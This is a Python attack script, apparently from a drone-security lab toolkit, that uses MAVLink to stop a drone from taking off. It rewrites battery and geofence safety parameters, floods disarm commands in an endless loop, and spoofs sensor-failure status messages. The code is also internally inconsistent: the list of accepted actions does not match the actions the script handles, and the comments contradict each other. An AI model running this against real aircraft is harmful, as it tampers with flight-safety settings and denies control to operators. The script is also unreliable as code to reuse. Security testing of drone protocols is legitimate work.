#!/usr/bin/env python3
"""
Denial-of-Takeoff Exploit Script
Prevents drone from taking off by modifying safety parameters and blocking commands
"""

import sys
import time
from pymavlink import mavutil

def set_parameter(connection, param_name, param_value, param_type=None):
    """Set a parameter value"""
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Auto-detect parameter type
    if param_type is None:
        if isinstance(param_value, bool):
            param_type = mavutil.mavlink.MAV_PARAM_TYPE_UINT8
            param_value = 1 if param_value else 0
        elif isinstance(param_value, int):
            param_type = mavutil.mavlink.MAV_PARAM_TYPE_INT32
        elif isinstance(param_value, float):
            param_type = mavutil.mavlink.MAV_PARAM_TYPE_REAL32
    
    # Ensure param_name is exactly 16 bytes
    param_id = param_name.ljust(16, '\x00')[:16]
    
    connection.mav.param_set_send(
        target_system,
        target_component,
        param_id.encode('utf-8'),
        param_value,
        param_type
    )
    
    time.sleep(0.5)
    msg = connection.recv_match(type='PARAM_VALUE', blocking=True, timeout=2)
    if msg:
        received_name = msg.param_id.rstrip('\x00')
        if received_name == param_name:
            print(f"[+] Parameter set: {param_name} = {param_value}")
            return True
    
    return False

def prevent_arming(connection):
    """Prevent arming by modifying safety parameters"""
    print("[*] Preventing arming...")
    
    # Disable arming checks
    set_parameter(connection, 'ARMING_CHECK', 0xFFFFFFFF)  # Enable all checks (opposite of disabling)
    # Actually, to prevent arming, we want to fail checks
    # Set ARMING_CHECK to require impossible conditions
    
    # Set minimum battery voltage too high
    set_parameter(connection, 'BATT_LOW_VOLT', 20.0)  # 20V minimum (impossible for most batteries)
    
    # Set geofence to zero radius
    set_parameter(connection, 'FENCE_ENABLE', 1)  # Enable geofence
    set_parameter(connection, 'FENCE_RADIUS', 0)  # Zero radius (always violated)
    
    print("[+] Arming prevention parameters set")

def block_takeoff_commands(connection):
    """Block takeoff commands by flooding with conflicting commands"""
    print("[*] Blocking takeoff commands...")
    
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Send DISARM command repeatedly
    for i in range(100):
        connection.mav.command_long_send(
            target_system,
            target_component,
            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
            0,
            0,  # Disarm
            0, 0, 0, 0, 0, 0, 0
        )
        time.sleep(0.01)
    
    print("[+] Takeoff commands blocked")

def cause_preflight_failure(connection):
    """Cause preflight checks to fail"""
    print("[*] Causing preflight check failures...")
    
    # Report false sensor failures
    # Send SYS_STATUS with failed sensors
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Report GPS as failed (sensor ID 1)
    connection.mav.sys_status_send(
        0xFFFFFFFF,  # Sensors present
        0xFFFFFFFF,  # Sensors enabled
        0xFFFFFFFE,  # Sensors health (GPS failed)
        0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0
    )
    
    print("[+] Preflight check failure injected")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 denial_of_takeoff.py <connection> [action]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  action        Action to perform:")
        print("                prevent-arming    Prevent arming via parameters")
        print("                block-commands    Block takeoff commands")
        print("                preflight-fail    Cause preflight check failure")
        print("                all               All of the above")
        print("\nExamples:")
        print("  python3 denial_of_takeoff.py udp:127.0.0.1:14550 prevent-arming")
        print("  python3 denial_of_takeoff.py udp:127.0.0.1:14550 all")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    action = sys.argv[2] if len(sys.argv) > 2 else 'all'
    
    # Validate action
    valid_actions = ['prevent-arming', 'modify-safety', 'fail-checks', 'all']
    if action not in valid_actions:
        print(f"[-] Unknown action: {action}")
        print(f"[*] Valid actions: {', '.join(valid_actions)}")
        sys.exit(1)
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Perform action
    if action == 'prevent-arming' or action == 'all':
        prevent_arming(connection)
    
    if action == 'block-commands' or action == 'all':
        block_takeoff_commands(connection)
    
    if action == 'preflight-fail' or action == 'all':
        cause_preflight_failure(connection)
    
    if action == 'all':
        print("\n[+] All denial-of-takeoff attacks executed")
        print("[*] Monitoring and maintaining attack (Press Ctrl+C to stop)...")
        try:
            while True:
                # Keep sending disarming commands
                block_takeoff_commands(connection)
                time.sleep(5)
        except KeyboardInterrupt:
            print("\n[*] Stopping denial-of-takeoff attack...")

if __name__ == "__main__":
    main()
